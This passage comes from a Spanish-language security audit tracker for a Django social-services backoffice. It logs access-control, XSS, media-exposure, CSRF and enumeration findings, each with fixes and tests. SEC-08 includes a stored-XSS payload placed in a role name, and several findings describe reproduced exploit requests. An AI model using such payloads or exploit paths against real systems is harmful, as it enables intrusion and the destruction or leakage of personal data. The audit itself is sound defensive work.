- **Ubicación:** `core/rbac.py:46-55` (módulo `programas`, `alcance: programa`, sin lista `programas`); `configuracion/views/programas.py:90`, `:120`, `:146`, `:175`, `:246`, `:290`, `:319`, `:357`, `:429` (`@requiere("programa.configurar")` global) y `:67` (listado).
- **Escenario (reproducido):** el admin de roles de Becas se tilda `programa.configurar` y `GET /configuracion/programas/<Dispositivos>/editar/paso1/` → 200.
- **Lo que NO hay que hacer:** mover `programa.configurar` a un módulo global (propuesta de P1). `programas/services/dispositivos.py:13` y `:56` (`puede_configurar_dispositivos`) la evalúan **con programa DISPOSITIVOS**; globalizarla rompe ese alcance.
- **Propuesta:**
  1. `core/rbac.py`: `puede_sin_programa(user, codigo)` → True si es superusuario activo o si alguna fila de `_filas_de_capacidad(user)` tiene ese codename con `programa_del_rol is None`; y el decorador `requiere_sin_programa(codigo, redirect_to=None)`.
  2. `configuracion/views/programas.py`: alta del wizard, paso 1 nuevo y acciones sin `pk` → `@requiere_sin_programa("programa.configurar")`. Vistas con `pk` (editar pasos, cambiar estado): `programa = get_object_or_404(Programa, pk=pk)` y `if not (rbac.puede_sin_programa(u, "programa.configurar") or rbac.puede(u, "programa.configurar", programa=programa)): return _respuesta_sin_permiso(...)`. Listado (`:67`): `puede_editar` por fila con el mismo criterio.
  3. `users/forms/roles.py` (`RolForm.clean`, no global): quitar `programa.configurar` de `permitidas` salvo que el programa del rol sea DISPOSITIVOS (único consumidor con alcance).
- **Tests a agregar:** `configuracion/tests/test_programas_alcance.py::test_configurar_de_rol_becas_no_edita_dispositivos` (302/403), `::test_configurar_global_edita_cualquiera`; `users/tests/test_roles_abm.py::test_admin_becas_no_puede_tildar_programa_configurar`; `programas/tests/test_dispositivos_config.py` en verde.
- **Verificación:** V-STD + `manage.py test configuracion users programas.tests.test_dispositivos_config`. Pre-chequeo P-03.
- **Dependencias:** G1b-02 (autoasignación de `programa.configurar` por quien solo tiene `programa.rol.administrar`) va en el mismo PR. Riesgo: el Cambio 20 (`users.0019`) dio `programa.configurar` a roles que ya la tenían.

### SEC-08 · XSS almacenado por el nombre de un rol, en todas las páginas del backoffice
**Severidad:** ALTA · **Estado:** CONFIRMADO con test (`SEC08XssRolTests`, 2 tests) · **Origen:** A5-08, V1-NEW-01 · **Ola:** 0 · **Esfuerzo:** S · **Decisión:** —

**Resolución:** ✅ Resuelto en #507 (Cambio 103), 01-oct-2026 — `base.html` recibe los grupos con `json_script` y el context processor dejó de exponer `user_groups_json`; tests en `core/tests/test_base_template_xss.py`. La whitelist opcional de `RolForm.clean_name` no se hizo (decisión registrada en el Cambio 103).
- **Ubicación:** `conversaciones/context_processors.py:24` (`str(groups).replace("'", '"')`); `templates/includes/base.html:372` (`window.userGroups = {{ user_groups_json|safe }};`); CSP con `'unsafe-inline'` (`config/middlewares/security_headers.py:38`).
- **Escenario (reproducido):** un rol `Op</script><script>alert(document.domain)</script>` se renderiza literal en `/inicio/`; un rol `Rol d'Ejemplo` produce `["Rol d"Ejemplo"]`, SyntaxError que aborta el `<script>` entero (incluido `window.conversacionesConfig`) en todas las páginas de sus usuarios. Pueden crear roles quienes tienen `rol.administrar` o `programa.rol.administrar`; `RolForm.clean_name` no restringe caracteres. Encadena con G2-03 (cambio de clave sin la actual).
- **Propuesta:** en `conversaciones/context_processors.py` borrar la clave `user_groups_json` (ya existe `user_groups_list`); en `base.html:372`:
  ```django
  {{ user_groups_list|json_script:"user-groups-data" }}
  <script>window.userGroups = JSON.parse(document.getElementById("user-groups-data").textContent);
  ```
  (y seguir con el resto del bloque). Consumidores: `static/custom/js/alertas_conversaciones*.js`, solo leen `window.userGroups`. Opcional: `RolForm.clean_name` con whitelist `^[\w\s().,/\-ÁÉÍÓÚÑáéíóúñ']+$`.
- **Tests a agregar:** `core/tests/test_base_template_xss.py::test_nombre_de_rol_no_rompe_script` (`</script><script>` no aparece literal) y `::test_apostrofe_en_nombre_de_rol` (el `json_script` contiene el apóstrofo escapado dentro de un JSON válido).
- **Verificación:** V-STD + V-UI.
- **Dependencias:** si G1-01 desmonta todo `conversaciones`, el context processor puede quedar; este fix es independiente.

### SEC-09 · `/media/`: nginx lo sirve sin login en DEV; en ECOM cualquier sesión (también la de un ciudadano) baja cualquier archivo
**Severidad:** ALTA en DEV, MEDIA en ECOM · **Estado:** CONFIRMADO-AJUSTADO (lectura de nginx + test `SEC09MediaTests` con `SERVE_MEDIA=True`) · **Origen:** A5-09, A2-12 · **Ola:** 0 (etapa 1) y 2 (etapa 2) · **Esfuerzo:** S + M · **Decisión:** D-09 (coordinación ECOM)

**Resolución:** 🟡 Parcial en #538 (Cambio 112), 03-oct-2026 — etapa 1 hecha en código: `nginx.conf` reemplaza los dos `location /media/` por `location /protected-media/` (`internal`, `attachment`, `nosniff`) y `/media/` cae en Django; `SERVE_MEDIA=True` para `web` en `docker-compose.prod.yml`; `PortalCiudadanoMiddleware` deja de eximir `/media/` (la sesión de un ciudadano ya no baja adjuntos, también en ECOM). Tests en `core/tests/test_media_protegida.py` (6). **Falta:** desplegarlo en icore-srv (R0b-11, operativo del PM: `web` antes que `nginx`; hasta entonces DEV sigue sirviendo `/media/` sin login) y la **etapa 2** (pertenencia por archivo, `X-Accel-Redirect`, `upload_to` con UUID), que sigue en la Ola 2, PR 7: hoy cualquier usuario de backoffice con sesión baja cualquier archivo. Seguimientos: R0b-07 (`/media/` abierto con `DEBUG=True`) y R0b-08 (comentarios viejos).
- **Ubicación:** `nginx.conf:62-65` y `:134-137` (`location /media/ { alias /media/; expires 7d; }`) → `docker-compose.prod.yml` → icore-srv (DEV `relevamiento-deshum.ecomdev.ar`); ECOM (`SERVE_MEDIA=True`): `config/urls.py:71-81` con `login_required(_media_serve)` sin pertenencia; `core/middleware.py:88` exime `/media/` para ciudadanos. Solo adjuntos y padrones de Becas usan UUID; `adjuntos/`, `ciudadanos/fotos/`, `admisiones/f00/` y `merenderos/solicitudes/%Y/%m/` conservan el nombre original.
- **Escenario:** con `SERVE_MEDIA=True`, anónimo → 302; ciudadano del portal (SEC-29) → **200** con el contenido. En DEV, por nginx, lo baja cualquiera sin sesión durante 7 días desde caché.
- **Propuesta:**
  - **Etapa 1 (Ola 0, DEV):** en `nginx.conf` reemplazar los dos bloques `/media/` por `location /protected-media/ { internal; alias /media/; add_header Content-Disposition attachment; add_header X-Content-Type-Options nosniff always; }` y dejar que `/media/` caiga en `location /` → Django; `SERVE_MEDIA=True` para `web` en `docker-compose.prod.yml`; quitar la exención de `/media/` en `core/middleware.py:88`. Reiniciar nginx (gotcha de IP cacheada).
  - **Etapa 2 (Ola 2):** `core/views/media.py::media_protegida(request, path)` que resuelve el dueño por prefijo: `adjuntos/` → `Adjunto` → `ciudadano.ver`; `admisiones/f00/` → `ArchivoAdmision` → `puede_operar_dispositivo`; `merenderos/solicitudes/` → `merendero.ver` con programa; `becas/…` → `_assert_scope_formulario`; `ciudadanos/fotos/` → `ciudadano.ver`; padrones → `es_admin_becas`. Con nginx responde `X-Accel-Redirect: /protected-media/<path>`; sin nginx, `FileResponse(..., as_attachment=True)`. Pasar a UUID los `upload_to` restantes (`legajos/models/base.py:57`, `:385`; `legajos/models/contactos.py:49`; `programas/models/__init__.py:878`, `:978`): migración de estado, los archivos existentes no se renombran.
- **Tests a agregar:** `core/tests/test_media_protegida.py`: `test_ciudadano_portal_no_descarga_media` (302 al perfil o 404 si el portal se apagó), `test_usuario_sin_capacidad_no_descarga_adjunto` (403), `test_con_capacidad_descarga_como_attachment`.
- **Verificación:** V-STD; en DEV, `curl -I https://relevamiento-deshum.ecomdev.ar/media/<ruta_conocida>` sin cookie → 302.
- **Dependencias:** Cambio 41 dejaba este pendiente de infraestructura; la app móvil **no** descarga `/media/` (verificado), así que `login_required` no la rompe. Mitigación de fondo para SEC-15.

### SEC-10 · Adjuntos de ciudadano y legajo: listar, subir y borrar sin capacidad ni pertenencia, con errores internos al cliente
**Severidad:** **CRÍTICA** (era ALTA) · **Estado:** CONFIRMADO con test (`SEC10AdjuntosTests`) · **Origen:** A5-10, A3-03 (adjuntos), A3-17 (fuga de `str(exc)`) · **Ola:** 2 → **R, dentro del PR R-19** · **Esfuerzo:** S-M · **Decisión:** —

**Re-evaluada el 04-oct-2026 por RED-89.** El barrido con un usuario de backoffice **sin ningún rol** volvió a medir el
borrado sobre `development @ cdd9c71`: `DELETE /legajos/archivos/<id>/eliminar/` → 200 `{"success": true}` y
`Adjunto.objects.filter(pk=…).exists()` → `False`. Es **hard delete sin papelera ni auditoría**, disponible para
**cualquier** cuenta de backoffice —incluido un rol de Becas o de Dispositivos sin una sola capacidad de Legajos—, sobre
documentos de cualquier ciudadano. Es el mismo criterio que puso a **SEC-02** en CRÍTICA («cualquier autenticado escribe
sobre datos del ciudadano»), con el agravante de que acá el daño es **irreversible**: lo que se destruye son los
documentos que la etapa 1 de SEC-09 puso detrás de login. Por eso sube a CRÍTICA y se adelanta a la Ola R.

**Ampliado por RED-89 — se implementa en R-19 (Ola R).** La ficha se ejecuta **completa** en ese PR, no en la Ola 2
(README §2.4 D-RED-14 y §6). Sus 4 h se mueven de la Ola 2 (PR 3) a la Ola R.
- **Ubicación:** `legajos/views/contactos_api.py:26-93` y `:182-188` (solo `@login_required`); `legajos/services/contactos.py:47-50` (`get_object_or_404(Adjunto, id=archivo_id).delete()` sin dueño); todos los `except Exception` devuelven `str(exc)` con 200.
- **Escenario (reproducido):** un usuario sin capacidades hace DELETE `/legajos/archivos/<id>/eliminar/` sobre un adjunto ajeno → `{"success": true}` y la fila se borra; el archivo físico queda huérfano.
- **Propuesta:** `@requiere("ciudadano.ver")` en `archivos_ciudadano_api` y `archivos_legajo_api`; `@requiere("ciudadano.editar")` en `subir_archivos_ciudadano`, `subir_archivos_legajo` y `eliminar_archivo`; ruta nueva `ciudadanos/<int:ciudadano_id>/archivos/<int:archivo_id>/eliminar/` (y la de legajo con uuid); servicio `eliminar_archivo_de_objeto(instance, archivo_id)` = `Adjunto.objects.get(content_type=ContentType.objects.get_for_model(type(instance)), object_id=instance.id, pk=archivo_id)` → `archivo.archivo.delete(save=False)` → `archivo.delete()`; ajustar el `fetch` de `ciudadano_detail.html`; reemplazar `str(exc)` por mensaje genérico + `logger.exception` y status 500 (dejar `ContactosFilesError` con 400). La robustez del listado (blob faltante, N+1) es LEG-04: mismo PR.
- **Tests a agregar:** `legajos/tests/test_adjuntos_rbac.py`: sin roles → 403 en listar, subir y eliminar; con `ciudadano.editar`, eliminar un adjunto de **otro** ciudadano → 404 y la fila sigue; error inesperado no expone el mensaje.
- **Verificación:** V-STD + V-UI (`ciudadano_detail.html` cambia).
- **Dependencias:** FE-02 (el mismo template usa `toastr`, que no está cargado: arreglar antes o junto para poder probar la subida).

**Resolución:** ✅ Resuelto en #556 (Cambio 126, PR R-19), 04-oct-2026 — `ciudadano.ver` para listar, `ciudadano.editar`
para subir y borrar. `archivos/<int:archivo_id>/eliminar/` **se retiró** y la reemplazan
`ciudadanos/<int:ciudadano_id>/archivos/<int:archivo_id>/eliminar/` y
`<uuid:legajo_id>/archivos/<int:archivo_id>/eliminar/`: el dueño viaja en la URL y acota el `filter`, así que un
adjunto de otro ciudadano no existe para la vista (404, la fila sigue). El servicio es
`eliminar_archivo_de_objeto(instance, archivo_id)` con `content_type` + `object_id`, que borra la fila y agenda el
blob con `transaction.on_commit`. **El orden importa y la revisión lo corrigió:** la primera versión borraba el blob
*antes* que la fila, como decía la propuesta, y el storage no participa de la transacción — si algo revertía después,
quedaba un `Adjunto` apuntando a un archivo que ya no existe, o sea el documento perdido igual. Al revés, lo peor que
pasa es un blob huérfano, que es recuperable. Los `except Exception` ya no devuelven `str(exc)` con 200: mensaje genérico (`ERROR_GENERICO`),
`logger.exception` con la traza y status real — 400 para `ContactosFilesError`, que sí es del usuario, 500 para lo
inesperado. El `fetch` de `ciudadano_detail.html` arma la URL según `tipo_origen` (el adjunto cuelga del ciudadano o
de uno de sus legajos) y manda `X-Requested-With`, para que el rebote por permisos llegue como JSON 403. **La UI
tampoco ofrece lo que el guard va a negar** (ronda 2 de la revisión): «Subir archivo», su modal y el botón de la
papelera van dentro de `{% if request.user|puede:"ciudadano.editar" %}` (`{% load rbac %}`), y el listener del form se
pide con `?.` porque el modal puede no existir.
**Dónde la ficha no coincidía con el código:** la propuesta nombraba una sola ruta nueva «y la de legajo con uuid»,
pero el listado del detalle de ciudadano **mezcla** adjuntos del ciudadano y de sus legajos, así que el front tiene que
elegir la ruta por fila; se resolvió con `tipo_origen`, que el serializador ya mandaba. FE-02 (`toastr`) sigue abierta
y es ajena: la subida se probó por HTTP, no por UI. **Test permanente:**
`legajos.tests.test_adjuntos_rbac` (en particular `AdjuntosRbacTests.test_la_ruta_sin_dueno_ya_no_existe`,
`AdjuntosAcotadosAlDuenoTests.test_borrar_el_adjunto_de_otro_ciudadano_da_404_y_no_borra` y
`AdjuntosAcotadosAlDuenoTests.test_el_archivo_fisico_se_borra_con_la_fila`).

### SEC-11 · APIs JSON de legajos (timeline, actividades, alertas, predicción de riesgo, evolución, historial) sin capacidad
**Severidad:** ALTA · **Estado:** CONFIRMADO con test (`SEC11LegajosJsonTests`) · **Origen:** A5-11, A3-03 (parte no adjuntos) · **Ola:** 2 (la parte `ciudadano.ver`/`ciudadano.editar`, adelantada a **R-19**) · **Esfuerzo:** S · **Decisión:** D-11

**Ampliado por RED-89 — se implementa en R-19 (Ola R), partida en dos.** El barrido del 04-oct confirmó estas rutas con
un usuario sin rol.

**Va a R-19:** `@requiere("ciudadano.ver")` en **las cinco**, como **piso**: `actividades_ciudadano_api`,
`evolucion_legajo_api` y `contactos_panel.historial_contactos_simple` —donde `ciudadano.ver` es además la capacidad
definitiva— y también `timeline_ciudadano_api`, `alertas_ciudadano_api` y `prediccion_riesgo_api`, cuya capacidad fina
es `ciudadano.sensible`. **El piso no es un atajo: es lo que permite que R-19 cierre en verde.** Si esas tres quedaran
con solo `@login_required` esperando a D-11, el PR no podría sacar sus `expectedFailure` del barrido de RED-89 y
cerraría con tres rutas abiertas a cualquier autenticado. `ciudadano.ver` ya existe y no necesita decisión, así que
tapa el agujero hoy sin anticiparse a nada. (`archivos_*` van con SEC-10, en el mismo PR.)

**Queda en la Ola 2 (PR 3):** **subir** esas tres de `ciudadano.ver` a `@requiere("ciudadano.sensible")` cuando se
resuelva **D-11**, coordinado con G1c-04. Es una línea por vista.

De las 2 h, 1 se mueve a la Ola R y 1 queda en la Ola 2. La ficha queda **🟡** al cerrar R-19 y ✅ con la Ola 2.
- **Escenario (reproducido):** un usuario sin capacidades recibe 200 en `timeline`, `alertas`, `prediccion-riesgo` y `actividades`, con el tipo «Riesgo Suicida».
- **Propuesta:** `@requiere("ciudadano.ver")` en `actividades_ciudadano_api`, `evolucion_legajo_api` y `contactos_panel.historial_contactos_simple`; `@requiere("ciudadano.sensible")` en `timeline_ciudadano_api`, `alertas_ciudadano_api` y `prediccion_riesgo_api` (default D-11) — **en dos pasos desde el 04-oct: R-19 pone `ciudadano.ver` en las seis y la Ola 2 sube esas tres a `ciudadano.sensible`** (ver el bloque de arriba). `cerrar_alerta_api` → SEC-18.
- **Tests a agregar:** `legajos/tests/test_contactos_api_rbac.py`: test parametrizado por nombre de URL con usuario sin roles → 403 (con `X-Requested-With` el decorador devuelve JSON 403).
- **Verificación:** V-STD + `manage.py test legajos`.

**Resolución:** 🟡 Parcial en #556 (Cambio 126, PR R-19), 04-oct-2026 — las **seis** vistas quedaron con
`@requiere("ciudadano.ver")`: `actividades_ciudadano_api`, `evolucion_legajo_api`,
`contactos_panel.historial_contactos_simple`, `timeline_ciudadano_api`, `alertas_ciudadano_api` y
`prediccion_riesgo_api`. Ninguna de las cinco del barrido de RED-89 queda abierta. **Falta la segunda mitad y por eso
es 🟡:** subir `timeline_ciudadano_api`, `alertas_ciudadano_api` y `prediccion_riesgo_api` de `ciudadano.ver` a
`@requiere("ciudadano.sensible")` cuando se resuelva **D-11** (Ola 2, PR 3, coordinado con G1c-04). Es una línea por
vista; en el código las tres llevan el comentario `# piso; la capacidad fina es ciudadano.sensible (D-11, Ola 2)`
para que se encuentren con un `git grep`. **Test permanente:**
`legajos.tests.test_contactos_api_rbac.ContactosApiRbacTests.test_sin_rol_ninguna_contesta` (y
`test_con_ciudadano_ver_contestan_las_tres_no_sensibles`, que fija que quien hoy usa Legajos con su rol normal
sigue entrando).

**Resolución:** ✅ Completa en #629 (Cambio 179), 08-oct-2026 - segunda mitad hecha con **D-11 = Sí**:
`timeline_ciudadano_api`, `alertas_ciudadano_api` y `prediccion_riesgo_api` pasan de `@requiere("ciudadano.ver")` a
`@requiere("ciudadano.sensible")`. Las otras tres (`actividades_ciudadano_api`, `evolucion_legajo_api`,
`contactos_panel.historial_contactos_simple`) se quedan en `ciudadano.ver`, que es su capacidad definitiva. El
mismo PR aplica D-11 al WebSocket (G1c-04) y al feed del inicio (R0b-09), que son las otras dos superficies del
mismo dato.

**Ampliación de la ronda 2 del PR: D-11 vale por canal, no por pantalla.** La primera vuelta dejó el **texto de la
alerta** saliendo por HTTP con `ciudadano.ver` en cuatro rutas más -`legajos/views/alertas.py`: dashboard,
`count-ajax`, `preview-ajax` y `cerrar-ajax`-, más `cerrar_alerta_api` y el `AlertasViewSet` de
`/api/legajos/alertas/`, al que esta misma auditoría le había reservado una excepción («es la campana del
navbar»). Es exactamente el dato que G1c-04 le cerró al mismo usuario por WebSocket, y -vía `config.administrar` →
`FiltrosUsuarioService.tiene_alcance_global`- de **todo** el padrón. Las seis superficies pasan a
`ciudadano.sensible`; la campana del navbar y su script, también. **Va sin migración de datos:** si el PM decide
que el Operador siga viendo alertas, se tilda `ciudadano.sensible` en el ABM de Roles.

**Séptima superficie, encontrada en la ronda 3: la solapa «Alertas activas» del legajo.** Las seis de arriba son
APIs; esta se renderiza del lado del servidor desde `legajos/selectors/ciudadanos.py`
(`build_ciudadano_detail_context` → `alertas_ciudadano`), así que no pasaba por ninguna de las capacidades que el
PR movió: con `ciudadano.ver` el detalle del ciudadano seguía mostrando el tipo y el mensaje de cada alerta
activa. El corte va en el selector -sin `ciudadano.sensible` el queryset es `none()` y **no consulta**-, y con él
se vacían el panel, el botón de la solapa y los tres contadores del encabezado.

**Quién pierde acceso:** nadie de los roles sembrados -«Gestión de Ciudadanos» ya trae `ciudadano.sensible`-; sí lo
pierde un rol armado a mano con `ciudadano.ver` y sin `ciudadano.sensible`, como el «Operador de backoffice» que
siembra `seed_rbac`: pierde el timeline, las alertas y el riesgo del ciudadano, el dashboard de alertas, **la
campana del navbar** (y con ella el contador y el punto de estado) y **la solapa «Alertas» del detalle del
ciudadano**. Lo que **no** pierde es el resto del detalle, que sigue abriendo con `ciudadano.ver`. En la otra
dirección, el PR no le da acceso nuevo a nadie: `actividad_reciente` se quedó en `ciudadano.sensible`, la
capacidad que ya pedía (ver R0b-09). **Test permanente:**
`legajos.tests.test_contactos_api_rbac.ContactosApiRbacTests.test_con_ciudadano_ver_las_tres_sensibles_ya_no_contestan`
(y `test_con_ciudadano_sensible_las_tres_contestan`,
`legajos.tests.test_alertas_rbac.AlertasRbacTests.test_con_ciudadano_ver_solo_ya_no_entra_a_ninguna`,
`test_con_ciudadano_ver_solo_no_lee_el_texto_de_la_alerta`,
`AlertasAlcanceTests.test_el_alcance_global_no_es_una_puerta_de_entrada` y
`AlertasApiTests.test_con_ciudadano_ver_solo_tampoco_lista` y, por la séptima superficie,
`AlertasEnElDetalleDelCiudadanoTests`).

### SEC-12 · Derivaciones: aceptar o rechazar por GET (CSRF) sin capacidad; inscripción directa por `is_staff`
**Severidad:** ALTA · **Estado:** CONFIRMADO con test (`SEC12DerivacionGetTests`) · **Origen:** A5-12, A3-04, G1c-07 · **Ola:** 2 · **Esfuerzo:** S (reusando `ciudadano.editar`) / M (capacidad nueva) · **Decisión:** D-12
- **Escenario (reproducido):** GET `/legajos/derivaciones-ciudadano/<id>/aceptar/` sin capacidad → la derivación pasa a ACEPTADA y se crea una `InscripcionPrograma`.
- **Propuesta (default D-12 = reusar `ciudadano.editar`):** en `legajos/views/derivacion_programa.py`, `aceptar_derivacion_programa` y `rechazar_derivacion_programa` con `@require_POST` + `@requiere("ciudadano.editar")`; `derivar_programa_view` con `@requiere("ciudadano.editar")` y `puede_inscripcion_directa = rbac.puede(request.user, "ciudadano.editar")` en lugar de `is_staff`; template `legajos/programas/programa_detail.html:290` con form POST + `{% csrf_token %}` + confirmación (SweetAlert2 en Legajos, Cambio 48). Si D-12 = capacidad nueva: `("ciudadano.derivar", "Derivar e inscribir ciudadanos en programas")` en el módulo `ciudadanos` del `CATALOGO` + migración de datos que la dé a los roles con `ciudadano.editar`.
- **Tests a agregar:** `test_aceptar_derivacion_get_405`, `test_rechazar_sin_capacidad_403_y_sigue_pendiente`, `test_inscripcion_directa_sin_capacidad_no_se_ofrece`.
- **Verificación:** V-STD + V-UI. La bandeja hoy está vacía (LEG-06), así que no se rompe UI operativa.
- **Dependencias:** LEG-02 (reactivar inscripción) y LEG-06 (decisión de derivaciones).

**Resolución:** ✅ Resuelto en #629 (Cambio 179), 08-oct-2026 - **DECISIÓN CLIENTE D-12 = reusar
`ciudadano.editar`**, sin capacidad nueva ni migración. `aceptar_derivacion_programa` y
`rechazar_derivacion_programa` van con `@requiere("ciudadano.editar")` + `@require_POST` (en ese orden: la
autorización se evalúa antes que el método, así un GET sin capacidad no revela que la ruta existe);
`derivar_programa_view` pasa de `@login_required` a `@requiere("ciudadano.editar")` y
`puede_inscripcion_directa` sale de `rbac.puede(user, "ciudadano.editar")` en vez de `request.user.is_staff`.
En `programas/programa_detail.html` «Rechazar» deja de ser un `<a>` (un GET) y es un form POST con
`{% csrf_token %}` y confirmación SweetAlert2. La bandeja hoy está **vacía** -`ProgramaDetailView` deja
`derivaciones_ciudadanos` en `[]` desde que se retiró `models_institucional` (LEG-06)-, así que el arreglo del
template es latente; las dos URLs, en cambio, siguen publicadas y ejecutables, que es lo que la PoC explotaba.
**Quién pierde acceso:** quien hoy inscribía directo por tener `is_staff` sin `ciudadano.editar` (hoy, nadie en
los roles sembrados), y cualquier autenticado sin capacidad, que es el agujero. **Test permanente:**
`legajos.tests.test_derivaciones_rbac` (en particular
`DerivacionesRbacTests.test_aceptar_por_get_es_405_y_no_inscribe`, la PoC `SEC12DerivacionGetTests` invertida,
y `DerivarProgramaViewRbacTests.test_is_staff_sin_capacidad_ya_no_ofrece_inscripcion_directa`).

### SEC-13 · Catálogo geográfico escribible por cualquier autenticado vía `/api/core/`
**Severidad:** ALTA · **Estado:** CONFIRMADO con test (`SEC13GeoApiTests`) · **Origen:** A5-13 (absorbe A5-40) · **Ola:** 0 · **Esfuerzo:** S · **Decisión:** —

**Resolución:** ✅ Resuelto en #541 (Cambio 115), 03-oct-2026 — `ProvinciaViewSet`, `MunicipioViewSet` y `LocalidadViewSet` pasan a `ReadOnlyModelViewSet`; los seis ViewSets de `core/api_views` (también `Sexo`, `Mes` y `Dia`, que ya eran de lectura) quedan con `[BackofficeAutenticado]`. Nadie escribía por `/api/core/` (el combo de domicilio usa `load_municipios`/`load_localidad`). Tests en `core/tests/test_api_geo.py` (escritura → 405 y las filas siguen; lectura 200; ciudadano del portal no lee).
- **Escenario (reproducido):** DELETE `/api/core/provincias/<id>/` sin capacidad → 204 (cascada a municipios y localidades). Con Basic de ciudadano, POST → 201. A5-40 (`static/custom/js/localidades_modal.js:45` pinta nombres con `innerHTML`) queda casi nulo al cerrar esto; el archivo además es JS huérfano (FE-14).
- **Propuesta:** en `core/api_views/__init__.py`, `ProvinciaViewSet`, `MunicipioViewSet` y `LocalidadViewSet` → `viewsets.ReadOnlyModelViewSet` (el ABM es web, `configuracion/views/geografia.py`, con `config.administrar`). Revisar que `SexoViewSet`, `MesViewSet` y `DiaViewSet` sean ReadOnly.
- **Tests a agregar:** `core/tests/test_api_geo.py::test_escritura_405` y `::test_lectura_autenticado_200`.
- **Verificación:** V-STD.

### SEC-14 · APIs del dashboard: enumeración del padrón por prefijo de DNI y alertas globales
**Severidad:** ALTA · **Estado:** CONFIRMADO con test (`SEC14DashboardApiTests`) · **Origen:** A5-14 · **Ola:** 0 · **Esfuerzo:** S · **Decisión:** —

**Resolución:** ✅ Resuelto en #541 (Cambio 115), 03-oct-2026 — las 5 vistas de `dashboard/api_views` llevan `BackofficeAutenticado` + capacidad: `buscar_ciudadanos` → `ciudadano.ver`; `alertas_criticas` y `actividad_reciente` → `ciudadano.sensible`, con las alertas resueltas por `FiltrosUsuarioService.obtener_alertas_usuario`; `metricas_dashboard` y `tendencias_datos` → `dashboard.ver`. En `inicio_view`, derivaciones solo con `ciudadano.ver` y conversaciones sin asignar solo con `conversacion.operar`; `templates/inicio.html` condiciona con `|puede` la tarjeta de tendencias y los feeds de «Mi trabajo de hoy» (desvío deliberado, registrado). Tests en `dashboard/tests/test_api_rbac.py` y `core/tests/test_inicio_rbac.py`. Seguimiento: R0b-09 (`actividad_reciente` mezcla inscripciones y derivaciones sin alcance bajo `ciudadano.sensible`).
- **Escenario (reproducido):** sin `ciudadano.ver`, GET `/api/buscar-ciudadanos/?q=301` → 200 con nombre y DNI (hasta 20 y `has_more`). G1b-05 (cuentas activas sin roles) lo agrava.
- **Propuesta (`dashboard/api_views/__init__.py`):** `buscar_ciudadanos` con `@permission_classes([BackofficeAutenticado, RequiereCapacidad("ciudadano.ver")])` (el buscador de `inicio.html:839` ya está dentro de `{% if user|puede:"ciudadano.ver" %}`); `alertas_criticas` y `actividad_reciente` con `ciudadano.sensible` y resolviendo las alertas con `FiltrosUsuarioService.obtener_alertas_usuario(request.user)`; `metricas_dashboard` y `tendencias_datos` con `dashboard.ver`. En `core/views/public.py` (`inicio_view`): `derivaciones_pendientes` solo si `puede(user, "ciudadano.ver")` y `conversaciones_sin_asignar` solo si `puede(user, "conversacion.operar")`.
- **Tests a agregar:** `dashboard/tests/test_api_rbac.py::test_buscar_ciudadanos_sin_capacidad_403` y `::test_con_ciudadano_ver_200`.
- **Verificación:** V-STD + `manage.py test dashboard core`.

### SEC-29 · Registro del portal: crea una cuenta sobre cualquier legajo existente con solo el DNI (puerta de entrada de SEC-01 y SEC-09)
**Severidad:** ALTA (sube desde BAJA) · **Estado:** CONFIRMADO con test (paso 1 de `SEC01BasicAuthTests`) · **Origen:** A5-41 · **Ola:** 0 · **Esfuerzo:** S · **Decisión:** D-29

**Resolución:** 🟡 Parcial en #511 (Cambio 102), 01-oct-2026 — `portal/urls.py` ya no publica `mi-perfil/*` (quedan `""`, `csrf/` y la inscripción por link); el middleware y `ciudadano_required` mandan a `portal:home`; comando nuevo `desactivar_usuarios_portal` (ensayo por defecto); tests en `portal/tests/test_portal_apagado.py`. Falta (operativo, PM): P-08 y `desactivar_usuarios_portal --aplicar` en PRD; no se corrió en ningún ambiente, así que las cuentas de ciudadano existentes siguen activas (ver SEC-09). Seguimiento: R0-02 (docs que nombran `portal:ciudadano_mi_perfil`).
- **Ubicación:** `portal/services/ciudadano_auth.py:56-64` (si existe un `Ciudadano` con ese DNI sin usuario, el flujo `legajo_existente` no consulta RENAPER ni verifica sexo); `portal/views/ciudadano_auth.py:66-132`; `portal/templates/portal/ciudadano/registro_step2.html:33-36`.
- **Escenario (reproducido):** step1 con DNI de un legajo existente → 302; step2 → 302 y queda logueado como dueño del legajo. Con cualquier DNI y sexo obtiene además el nombre completo de RENAPER.
- **Propuesta:** el portal está sin uso (decisión del PM, 29-sep-2026). En `portal/urls.py`, quitar todas las rutas `mi-perfil/*` y dejar `""`, `csrf/` e `inscripcion/<uuid:token>/…` (la inscripción pública **sí** queda). `core/middleware.py:91` redirige a `portal:ciudadano_mi_perfil`: cambiarlo a `portal:home`. Grep `{% url 'portal:ciudadano_` y `compile_templates.py` para que no quede ninguna referencia. Datos (default D-29): `User.objects.filter(groups__name="Ciudadanos").update(is_active=False)` en una migración de datos o un comando, después de contar con P-08.
- **Tests a agregar:** `portal/tests/test_portal_apagado.py::test_registro_no_existe` (`resolve("/portal/mi-perfil/registro/")` → 404) y `::test_inscripcion_publica_sigue`.
- **Verificación:** V-STD + V-UI + `manage.py test portal`.

### G1-01 · Chat público de conversaciones: cualquiera, sin login, crea el legajo de cualquier DNI con el nombre que quiera, y ese legajo después alimenta Becas y SIIS
**Severidad:** ALTA · **Estado:** CONFIRMADO (lectura) · **Origen:** G1-01; resuelve también A5-42 y A6-28 en su fase 2 · **Ola:** 0 (rutas públicas) / 7 (apagado completo) · **Esfuerzo:** S · **Decisión:** tomada (conversaciones sin uso, 29-sep-2026)

**Ampliado por RS-R4-03 y RS-R4-13 (04-oct-2026, frente Red de seguridad):** la fase 2 no es de 2 h. El shell de todo el backoffice (`templates/includes/base.html:371-396`, 5 `{% url %}` a `conversaciones`), el context processor `conversaciones.context_processors.user_groups` (provee variables que no son de conversaciones) y la señal de `legajos/signals/alertas.py:4` (importa `conversaciones.models` en `ready()`) dependen de la app: desmontarla sin tocarlos da 500 en todas las pantallas o impide arrancar. Trabajo y tests en RED-13 (test de caracterización en la Ola R, refactor de 8 h en la Ola 7 antes del apagado).

**Resolución:** 🟡 Parcial en #510 (Cambio 101), 01-oct-2026 — hecha la parte de la Ola 0: desmontadas `chat/`, `consultar-renaper/`, `iniciar/`, `<id>/enviar/` y `<id>/mensajes/`, y borrados `iniciar_conversacion_publica` (el `get_or_create` de legajos), sus forms y `chat_ciudadano.html`. Falta: la fase 2 (Ola 7); P-10 en PRD (operativo). `<id>/evaluar/` (R0-01) se desmontó en #537 (Cambio 111), 03-oct-2026: ya no queda escritura anónima en `conversaciones`.
